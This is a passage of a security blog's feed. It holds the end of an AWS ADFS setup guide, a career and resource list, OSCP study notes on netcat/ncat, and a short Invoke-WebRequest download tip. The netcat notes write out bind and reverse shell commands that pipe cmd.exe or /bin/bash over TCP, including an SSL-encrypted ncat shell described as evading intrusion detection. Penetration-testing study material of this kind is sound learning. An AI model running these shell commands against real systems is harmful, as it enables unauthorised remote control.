src="5E7AD0B0F24749E2B48C052FEFBB35DE" alt="image"></p><p>可以看到，已经登陆成功了。</p><p><img src="D35525139D4B41169E5618112F6C81F4" alt="image"></p><p>至于配置其他账号的，只要在对应的域下创建相应的分组、AWS账号下创建相应的身份提供商，role即可。</p><p>大概长这样：</p><p><img src="F7051BF59F514D83AFAC41FF03F74145" alt="image"></p><h2 id="0x06-常见的故障排查方法"><a href="#0x06-常见的故障排查方法" class="headerlink" title="0x06 常见的故障排查方法"></a>0x06 常见的故障排查方法</h2><ul><li>报错一<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RoleSessionName is required in AuthnResponse (Service: AWSSecurityTokenService; Status Code: 400; Error Code: InvalidIdentityToken; Request ID: e0aa4b8e-e990-11e9-8d71-e307abd5d2b3). Please try again.</span><br></pre></td></tr></table></figure></li></ul><p>报这条错误，一般就是roles这条规则配置的有问题（比如role的arn号等，global用的aws中国区是aws-cn），抓包，base64解码对下就能看到了，还有可能是rolesessionname没设置一类的，这个就要在域账号那一端补充邮件地址。</p><h2 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h2><ul><li><a href="https://aws.amazon.com/cn/blogs/security/aws-federated-authentication-with-active-directory-federation-services-ad-fs/" target="_blank" rel="noopener">AWS Federated Authentication with Active Directory Federation Services (AD FS)</a></li><li><a href="https://docs.amazonaws.cn/IAM/latest/UserGuide/troubleshoot_saml.html#troubleshoot_saml_invalid-response" target="_blank" rel="noopener">Troubleshooting SAML 2.0 Federation with AWS</a></li><li><a href="https://aws.amazon.com/cn/blogs/china/adfs-bjs/" target="_blank" rel="noopener">为AWS北京区管理控制台集成ADFS访问</a></li><li><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn383662(v=ws.11" target="_blank" rel="noopener">Install and Configure the Web Application Proxy Server</a>)</li></ul><h2 id="0x08-Timeline"><a href="#0x08-Timeline" class="headerlink" title="0x08 Timeline"></a>0x08 Timeline</h2><ul><li>2019.10.08 初步完成该文章，并公开发布。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;在这篇文章中，我将以中国区AWS为例，向大家介绍如何配置ADFS，使其可以登陆多个AWS账号，以此来
      
    
    </summary>
    
    
      <category term="AWS" scheme="https://tonghuaroot.com/tags/AWS/"/>
    
  </entry>
  
  <entry>
    <title>一个信息安全从业人员的自我修养——我的安全技术栈</title>
    <link href="https://tonghuaroot.com/2019/10/07/My-security-technology-stack/"/>
    <id>https://tonghuaroot.com/2019/10/07/My-security-technology-stack/</id>
    <published>2019-10-07T00:19:49.000Z</published>
    <updated>2019-10-10T09:46:10.137Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>曾经很长一段时间一直被一件事情困扰着，就是学过的新技术被闲置一段时间之后，当再捡起来时有种无从下手的感觉。很多技术点都被遗忘了，虽然自己一直有整理笔记的习惯，但奈何越来越多琐碎的一坨坨知识点放在云笔记上再去检索也是一个难题。并且有的笔记没有发出来就有一种懈怠的感觉，随随便便写下，当再次翻看的时候又无从下手了。</p><p>基于以上的问题，既然遗忘是无法避免的，倒不如把之前研究的东西、学习资料以及未来想学习的东西分享出来，形成一个近似标准化的文档，一来是避免遗忘，形成真正有价值的『学习笔记』，当自己真正需要一些东西的时候，方便快速定位到具体目标。二来是也算是分享一下目前的状态，如果能遇到同类，那还是极好的。</p><p>当然，文档中的内容只是我的一家之言，如果你有任何不同的观点也欢迎讨论。</p><h2 id="0x01-我的信息安全学习之路"><a href="#0x01-我的信息安全学习之路" class="headerlink" title="0x01 我的信息安全学习之路"></a>0x01 我的信息安全学习之路</h2><p>踏入安全行业，我是从渗透测试开始的，更准确的说是从『工具小子』开始。</p><ul><li>08年第一次接触信息安全，使用的第一个安全工具是『啊D注入工具』，百度搜索<code>asp?id=``、SQL注入、</code>xp_cmdshel<code>、</code>net user<code>`</code>加账号、3389上去一把梭，好不快活。而后接触了越来越多Windows下各类图形化的安全工具（信息收集、端口扫描、SSQL注入、打包好的exploit工具、提权、权限维持、端口转发等等），接触了Linux，学习Linux上头的各种命令行工具。整体的学习方式都是需求驱动的野路子，比如说我SQL注入拿了一个站，登上去发现 ipconfig 不好使了，我才知道这个世界上除了Windows还有Linux这种操作系统的存在。当然这个阶段也是野蛮生长的阶段，加了各种安全团队QQ群，各种安全社区林立（还有很多用屏幕共享专家录的视频教程，我就是看的这些视频入门的，啊哈哈哈。当然至于在08年还在读初中的我是怎么接触这个圈子的，那就是另外一个故事了。）</li><li>时间久了，靠着别人写的工具抓鸡拿站也没啥意思。那会好多论坛里也在讨论一个观点就是说『一个不懂编程的人是永远不可能成为一个好黑客的』，asp再那段时间逐渐开始谢幕，越来越多的站点都开始使用LAMP这种解决方案，充其量再来个站库分离，内网是没有ACL划分的，没有现在这种安全产品（firewall、IDS那些就是个摆设，当然现在很多企业买来了设备之后也都是处于吃灰的状态，不过至少大环境跟以前是完全不一样的。）拿到了webshell基本上内网就都是你的了。也是在这个时候开始接触了PHP，能不能代码审计出SQL注入，就看研发有没有用intval()了，框架级、体系化的代码审计漏洞挖掘是不存在的，基本就是看别人怎么挖，我也就跟着怎么挖的状态。</li><li>时间来到了2014年，习大大第一次提出了“没有网络安全就没有国家安全，没有信息化就没有现代化。”大型互联网公司的信息安全团队愈发壮大，政府机构开始对信息安全愈发的重视，也提出了更高的要求。而我也正式步入大学的校园，开始我的大学生活。系统的学习计算机基础知识算是这4年的主旋律。</li><li>当然野路子出身的我肯定是不能满足这种两点一线按部就班的生存状态的，2015年来到北京开始了我的第一份实习工作——在永信的技术研究实验室做『渗透』，也是这份工作让我真正的见识到了一个优秀的渗透团队是如何协作的，每一个真正的渗透师是如何各种手段完成自己的工作。这段时间的成长对我来说是飞快地，技术、眼界，也是这一次的实习让我真正的踏入了信息安全行业。至于说具体做了哪些工作，那是绝对不能讲的，总之和那种搞等保拿扫描器扫扫出报告是不一样的。</li><li>后来我就去了360，前后经历了攻防实验室、信息安全部。攻防实验室那会做国内外安全研究paper的监控、安全事件安全漏洞预警，让我见识到了安全领域不仅仅是渗透测试，Web安全、移动安全、社会工程、系统安全、网络安全、AI安全（后面会重点说）、安全开发、威胁情报、甲方企业安全建设、安全运营、红蓝对抗、各类企业级的安全产品甚至安全合规等等，只能说国内外工业界各类前沿的安全技术在这里是都有机会接触到的（说来惭愧，没能在一个方向上做到dive deep），也是这段工作经历让我有机会接触到了各类的信息安全从业人员，让我对信息安全行业全局观有了一定的了解。信息安全部（Okee Team）做的是甲方企业企业安全建设以及对外输出安全能力，这段工作经历让我有机会接触到了大型互联网企业是如何做安全的，各种安全技术、安全产品是如何落地安全建设，也是这段工作经历让我真正懂得了『纵深防御』、『木桶原理』，没有漏洞，不会被黑客入侵是可望不可及的终极目标。尽可能的减少高中危漏洞、安全事件异常行为监控告警、安全事件的及时响应、事后复盘优化流程才是甲方安全建设的主旋律。</li><li>现在我在做云安全，同时也在探索机器学习算法为安全建设做一些锦上添花的小事。</li></ul><h2 id="0x02-安全技术栈"><a href="#0x02-安全技术栈" class="headerlink" title="0x02 安全技术栈"></a>0x02 安全技术栈</h2><p>啰嗦了这么多，接下来才是本文的重点，我会在这一节，把我学过的东西、准备学的东西、自己输出的学习笔记、整理的学习资料做一个分享。一共分为以下几个部分：</p><ul><li>Penetration test</li><li>Data-driven Security</li><li>Cloud Security</li><li>Security R&amp;D</li><li>计算机基础</li></ul><h3 id="Penetration-test"><a href="#Penetration-test" class="headerlink" title="Penetration test"></a>Penetration test</h3><h4 id="安全工具"><a href="#安全工具" class="headerlink" title="安全工具"></a>安全工具</h4><p>sqlmap、msf这些就先不往上写了，之后可能会加进来。</p><ul><li><a href="https://github.com/chaitin/xray" target="_blank" rel="noopener">xray 安全评估工具</a>：被动扫描刷SRC神器</li><li><a href="https://gobies.org" target="_blank" rel="noopener">Goby:Attack surface mapping</a></li></ul><h4 id="OSCP"><a href="#OSCP" class="headerlink" title="OSCP"></a>OSCP</h4><p>国外很多企业招渗透测试工程师都很看重这个认证，国内也越来越重视了。考试费用800+，除了可以在lab上练习之外，报名前可以在下面的平台上练手。</p><ul><li>HacktheBox</li></ul><h3 id="Data-driven-Security"><a href="#Data-driven-Security" class="headerlink" title="Data-driven Security"></a>Data-driven Security</h3><h4 id="Blog"><a href="#Blog" class="headerlink" title="Blog"></a>Blog</h4><ul><li><a href="http://4o4notfound.org/" target="_blank" rel="noopener">404 Not Found’Blog</a></li><li><a href="https://www.cdxy.me/" target="_blank" rel="noopener">cdxy</a></li></ul><h4 id="书"><a href="#书" class="headerlink" title="书"></a>书</h4><ul><li>《机器学习》</li><li>《机器学习实战》</li><li>《动手深度学习》</li><li>《深度学习》</li></ul><h4 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h4><ul><li>公众号【深度之眼】：会发一些上面经典机器学习教材方面的视频教程（很便宜，其实想学习的话获取各类知识真的是很廉价的啊）</li><li>吴恩达机器学习：网易课堂上有中文字幕的版本</li><li>沐神的《动手深度学习》：mxnet为基础录得一套视频</li><li>伯克利有一套深度学习的课在youtube上可以翻到（拿《动手深度学习》这本书做教材）</li><li>台大李宏毅的机器学习</li></ul><h3 id="Cloud-Security"><a href="#Cloud-Security" class="headerlink" title="Cloud Security"></a>Cloud Security</h3><h4 id="Paper"><a href="#Paper" class="headerlink" title="Paper"></a>Paper</h4><ul><li><a href="https://arxiv.org/pdf/1709.07095.pdf" target="_blank" rel="noopener">Practical Machine Learning for Cloud Intrusion Detection: Challenges and the Way Forward</a></li></ul><h4 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h4><ul><li>AWS 安全产品文档及白皮书（IAM/KMS/Security Hub/GuardDuty等等）</li></ul><h4 id="视频-1"><a href="#视频-1" class="headerlink" title="视频"></a>视频</h4><ul><li><a href="https://www.youtube.com/playlist?list=PLhr1KZpdzuke2ncPH0DVp9PswBFY5dIl6" target="_blank" rel="noopener">AWS re:Inforce 2019 Sessions</a></li></ul><h4 id="会议"><a href="#会议" class="headerlink" title="会议"></a>会议</h4><ul><li><a href="https://reinforce.awsevents.com/" target="_blank" rel="noopener">AWS re:Inforce</a></li></ul><h3 id="Security-R-amp-D"><a href="#Security-R-amp-D" class="headerlink" title="Security R&amp;D"></a>Security R&amp;D</h3><h4 id="书-1"><a href="#书-1" class="headerlink" title="书"></a>书</h4><ul><li>《Go语言实战》</li></ul><h4 id="视频教程"><a href="#视频教程" class="headerlink" title="视频教程"></a>视频教程</h4><ul><li><a href="https://www.bilibili.com/video/av51984570" target="_blank" rel="noopener">Golang</a></li></ul><h3 id="计算机基础"><a href="#计算机基础" class="headerlink" title="计算机基础"></a>计算机基础</h3><h2 id="书-2"><a href="#书-2" class="headerlink" title="书"></a>书</h2><ul><li>《深入理解计算机系统》</li></ul><h2 id="科普"><a href="#科普" class="headerlink" title="科普"></a>科普</h2><ul><li><a href="https://mp.weixin.qq.com/s/_2CPFLW3Oft3bpsdjZe7Hg" target="_blank" rel="noopener">相声：CPU和内存是怎么一起“鬼混”的</a></li></ul><h2 id="0X03-安全站点收集"><a href="#0X03-安全站点收集" class="headerlink" title="0X03 安全站点收集"></a>0X03 安全站点收集</h2><p>把我经常逛的站点分享一下，还有很多RSS源一些国内外安全研究人员、安全公司、安全媒体一类的，等之后整理一下再传上来。</p><h3 id="国内"><a href="#国内" class="headerlink" title="国内"></a>国内</h3><ul><li><a href="https://www.anquanke.com/" target="_blank" rel="noopener">安全客</a>：老东家，放在第一位了。</li><li><a href="https://paper.seebug.org/" target="_blank" rel="noopener">Paper</a></li><li><a href="https://www.sec-wiki.com/" target="_blank" rel="noopener">SecWiki</a></li><li><a href="https://xz.aliyun.com/" target="_blank" rel="noopener">阿里先知</a></li><li><a href="https://www.4hou.com/" target="_blank" rel="noopener">嘶吼</a></li><li><a href="http://www.91ri.org/" target="_blank" rel="noopener">91Ri</a></li><li><a href="https://www.freebuf.com/" target="_blank" rel="noopener">Freebuf</a></li></ul><h3 id="国外"><a href="#国外" class="headerlink" title="国外"></a>国外</h3><ul><li><a href="https://www.reddit.com/r/netsec/new" target="_blank" rel="noopener">netsec</a></li></ul><h3 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h3><ul><li>安全学术圈</li></ul><h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04 结语"></a>0x04 结语</h2><p>上述为本人一之言，欢迎讨论，如果你有更好的想法、资源，也欢迎贡献。</p><h2 id="0x05-Timeline"><a href="#0x05-Timeline" class="headerlink" title="0x05 Timeline"></a>0x05 Timeline</h2><ul><li>2019.10.07 写了这篇文章，并初步分享一些资料，之后整理了还会逐渐再发上来。</li><li>2019.10.08 增加SecWiki、安全学术圈，以及部分计算机基础相关的资源</li><li>2019.10.10 把cdxy老哥的blog加进来了，做智能安全算法的大佬</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;曾经很长一段时间一直被一件事情困扰着，就是学过的新技术被闲置一段时间之后，当再捡起来时有种无从下手的
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>OSCP Note - Common use of Netcat(nc) and Ncat</title>
    <link href="https://tonghuaroot.com/2019/06/18/OSCP-Note-Common-use-of-Netcat-nc-and-Ncat/"/>
    <id>https://tonghuaroot.com/2019/06/18/OSCP-Note-Common-use-of-Netcat-nc-and-Ncat/</id>
    <published>2019-06-18T23:57:25.000Z</published>
    <updated>2019-06-19T08:34:09.566Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-TL-DR"><a href="#0x00-TL-DR" class="headerlink" title="0x00 TL;DR"></a>0x00 TL;DR</h2><p>The article records some ways to use nc.</p><ul><li>Determine if the target port is open</li><li>Connecting to a TCP/UDP Port</li><li>Listening on a TCP/UDP Port</li><li>Transferring Files with Netcat</li><li>Remote Administration with Netcat</li><li>Ncat:more security’s nc</li></ul><h2 id="0x01-Determine-if-the-target-port-is-open"><a href="#0x01-Determine-if-the-target-port-is-open" class="headerlink" title="0x01 Determine if the target port is open"></a>0x01 Determine if the target port is open</h2><ul><li>Port open</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 ~]$ nc -vz 10.0.0.64 22</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Connected to 10.0.0.64:22.</span><br><span class="line">Ncat: 0 bytes sent, 0 bytes received in 0.53 seconds.</span><br></pre></td></tr></table></figure><ul><li>Port close</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 ~]$ nc -vz 10.0.0.64 23</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Connection refused.</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$</span><br></pre></td></tr></table></figure><h2 id="0x02-Connecting-to-a-TCP-UDP-Port"><a href="#0x02-Connecting-to-a-TCP-UDP-Port" class="headerlink" title="0x02 Connecting to a TCP/UDP Port"></a>0x02 Connecting to a TCP/UDP Port</h2><p>Useful:</p><ul><li>check port is open or closed</li><li>read a banner</li><li>To connect to a network service manually</li></ul><p>example:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 ~]$ nc -nv 10.0.0.64 22</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Connected to 10.0.0.64:22.</span><br><span class="line">SSH-2.0-OpenSSH_7.4</span><br><span class="line"></span><br><span class="line">Protocol mismatch.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ncat: Broken pipe.</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$</span><br></pre></td></tr></table></figure><h2 id="0x03-Listening-on-a-TCP-UDP-Port"><a href="#0x03-Listening-on-a-TCP-UDP-Port" class="headerlink" title="0x03 Listening on a TCP/UDP Port"></a>0x03 Listening on a TCP/UDP Port</h2><p>Useful:</p><ul><li>network debugging client applications</li><li>otherwise receiving a TCP/UDP network connection</li></ul><p>Server side listen TCP port 4444:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 ~]$ nc -nvlp 4444</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br></pre></td></tr></table></figure><p>Use netstat can see TCP port 4444 is open.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 ~]$ sudo netstat -nltp | grep 4444</span><br><span class="line">tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      7427/nc</span><br><span class="line">tcp6       0      0 :::4444                 :::*                    LISTEN      7427/nc</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$</span><br></pre></td></tr></table></figure></p><p>Clienr side can connect this TCP port and chat with server side.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 ~]$ nc -nv 10.0.0.64 4444</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Connected to 10.0.0.64:4444.</span><br><span class="line">aaaa</span><br><span class="line">aaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure></p><h2 id="0x04-Transferring-Files-with-Netcat"><a href="#0x04-Transferring-Files-with-Netcat" class="headerlink" title="0x04 Transferring Files with Netcat"></a>0x04 Transferring Files with Netcat</h2><p>Note the Windows Firewall configuration.<br>Text and binary file all support.</p><p>Server side(Target machine):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">D:\netcat-win32-1.12&gt;nc64.exe -nlvp 4444 &gt; wget.exe</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.0.0.39] from (UNKNOWN) [52.80.67.xxx] 59980</span><br></pre></td></tr></table></figure></p><p>Client side:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 temp]$ nc -nv 54.222.196.xxx 4444 &lt; wget.exe</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Connected to 54.222.196.xxx:4444.</span><br><span class="line">Ncat: 308736 bytes sent, 0 bytes received in 0.62 seconds.</span><br></pre></td></tr></table></figure></p><h2 id="0x05-Remote-Administration-with-Netcat"><a href="#0x05-Remote-Administration-with-Netcat" class="headerlink" title="0x05 Remote Administration with Netcat"></a>0x05 Remote Administration with Netcat</h2><p>Netcat can take an executable file and redirect the input(stdin), output(stdout), and error messages(stderr) to a TCP/UDP port rather than the default console.</p><h3 id="nc-Bind-Shell"><a href="#nc-Bind-Shell" class="headerlink" title="nc Bind Shell"></a>nc Bind Shell</h3><p>Service side(Windows):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">D:\netcat-win32-1.12&gt;nc -nlvp 4444 -e cmd.exe</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.0.0.39] from (UNKNOWN) [52.80.67.111] 60420</span><br></pre></td></tr></table></figure></p><p>Linux can use this command bind shell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 4444 -e /bin/bash</span><br></pre></td></tr></table></figure></p><p>client side:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 temp]$ nc -nv 54.222.196.xxx 4444</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Connected to 54.222.196.xxx:4444.</span><br><span class="line">Microsoft Windows [▒汾 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation▒▒▒▒▒▒▒▒▒▒Ȩ▒▒</span><br><span class="line"></span><br><span class="line">D:\netcat-win32-1.12&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">ec2amaz-okar8bt\administrator</span><br><span class="line"></span><br><span class="line">D:\netcat-win32-1.12&gt;</span><br></pre></td></tr></table></figure></p><h3 id="nc-Reverse-Shell"><a href="#nc-Reverse-Shell" class="headerlink" title="nc Reverse Shell"></a>nc Reverse Shell</h3><p>Service side:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\netcat-win32-1.12&gt;nc -nlvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br></pre></td></tr></table></figure></p><p>Client side:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 temp]$ nc -nv 54.222.196.xxx 4444 -e /bin/bash</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Connected to 54.222.196.xxx:4444.</span><br></pre></td></tr></table></figure></p><p>Then you can execute command in this reverse shell, like this:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">D:\netcat-win32-1.12&gt;nc -nlvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.0.0.39] from (UNKNOWN) [52.80.67.111] 40908</span><br><span class="line">id</span><br><span class="line">uid=1000(ec2-user) gid=1000(ec2-user) groups=1000(ec2-user),4(adm),10(wheel),190(systemd-journal)</span><br></pre></td></tr></table></figure></p><h2 id="0x06-Ncat-more-security’s-nc"><a href="#0x06-Ncat-more-security’s-nc" class="headerlink" title="0x06 Ncat:more security’s nc"></a>0x06 Ncat:more security’s nc</h2><ul><li>Encryption of the bind or reverse shell will aid the penetration tester in avoiding intrusion detection systems</li><li>Not expose the penetrated machines to unwanted IP addresses.</li></ul><p>Server side:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 temp]$ ncat --exec /bin/bash --allow 54.222.196.xxx -vnl 4444 --ssl</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.</span><br><span class="line">Ncat: SHA-1 fingerprint: C900 5192 97CA 45E9 0B30 DB8E D76A D8D3 2673 3BF3</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 54.222.196.xxx.</span><br><span class="line">Ncat: Connection from 54.222.196.xxx:63540.</span><br></pre></td></tr></table></figure><p>Client side:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\NcatPortable-master\NcatPortable-master&gt;ncat -v 52.80.67.xxx 4444 --ssl</span><br><span class="line">Ncat: Version 5.59BETA1 ( http://nmap.org/ncat )</span><br><span class="line">Ncat: SSL connection to 52.80.67.xxx:4444.</span><br><span class="line">Ncat: SHA-1 fingerprint: C900 5192 97CA 45E9 0B30 DB8E D76A D8D3 2673 3BF3</span><br><span class="line">id</span><br><span class="line">uid=1000(ec2-user) gid=1000(ec2-user) groups=1000(ec2-user),4(adm),10(wheel),190(systemd-journal)</span><br></pre></td></tr></table></figure></p><p>Then you can execute command in this bind shell.</p><h2 id="0x07-Command-summary"><a href="#0x07-Command-summary" class="headerlink" title="0x07 Command summary"></a>0x07 Command summary</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nc -vz 10.0.0.64 22</span><br><span class="line">nc -nv 10.0.0.64 22</span><br><span class="line">nc -nvlp 4444</span><br><span class="line">nc64.exe -nlvp 4444 &gt; wget.exe</span><br><span class="line">nc -nv 54.222.196.xxx 4444 &lt; wget.exe</span><br><span class="line">nc -nlvp 4444 -e cmd.exe</span><br><span class="line">nc -nlvp 4444 -e /bin/bash</span><br><span class="line">nc -nv 54.222.196.xxx 4444 -e /bin/bash</span><br><span class="line">ncat --exec /bin/bash --allow 54.222.196.xxx -vnl 4444 --ssl</span><br><span class="line">ncat -v 52.80.67.xxx 4444 --ssl</span><br></pre></td></tr></table></figure><h2 id="0x08-Reference"><a href="#0x08-Reference" class="headerlink" title="0x08 Reference"></a>0x08 Reference</h2><ul><li><a href="https://en.wikipedia.org/wiki/Netcat" target="_blank" rel="noopener">netcat</a></li><li><a href="http://netcat.sourceforge.net/" target="_blank" rel="noopener">The GNU Netcat project</a></li><li><a href="http://nmap.org/ncat/" target="_blank" rel="noopener">Ncat</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-TL-DR&quot;&gt;&lt;a href=&quot;#0x00-TL-DR&quot; class=&quot;headerlink&quot; title=&quot;0x00 TL;DR&quot;&gt;&lt;/a&gt;0x00 TL;DR&lt;/h2&gt;&lt;p&gt;The article records some ways to use n
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>A command similar to wget in Windows: Invoke-WebRequest</title>
    <link href="https://tonghuaroot.com/2019/05/29/A-command-similar-to-wget-in-Windows-Invoke-WebRequest/"/>
    <id>https://tonghuaroot.com/2019/05/29/A-command-similar-to-wget-in-Windows-Invoke-WebRequest/</id>
    <published>2019-05-29T00:40:20.000Z</published>
    <updated>2019-05-29T09:15:19.223Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-TL-DR"><a href="#0x00-TL-DR" class="headerlink" title="0x00 TL;DR"></a>0x00 TL;DR</h2><p>Linux can use wget command to download files. In this article, we will introduce the powershell command for Windows download files: Invoke-WebRequesit.</p><h2 id="0x01-Invoke-WebRequest-Demo"><a href="#0x01-Invoke-WebRequest-Demo" class="headerlink" title="0x01 Invoke-WebRequest Demo"></a>0x01 Invoke-WebRequest Demo</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WebRequest http://52.80.67.123:8000/get-process.ps1 -OutFile c:\get-process.ps1</span><br></pre></td></tr></table></figure><h2 id="0x02-Reference"><a href="#0x02-Reference" class="headerlink" title="0x02 Reference"></a>0x02 Reference</h2><ul><li><a href="https://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Utility/Invoke-WebRequest?view=powershell-5.1" target="_blank" rel="noopener">Invoke-WebRequest</a></li><li><a href="https://www.pstips.net/cat/powershell-%E8%A7%86%E9%A2%91%E6%95%99%E7%A8%8B" target="_blank" rel="noopener">PowerShell Guide(Video)</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-TL-DR&quot;&gt;&lt;a href=&quot;#0x00-TL-DR&quot; class=&quot;headerlink&quot; title=&quot;0x00 TL;DR&quot;&gt;&lt;/a&gt;0x00 TL;DR&lt;/h2&gt;&lt;p&gt;Linux can use wget command to download
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Use AWS SSM(Systems Manager) execute remote script file at EC2 instance</title>
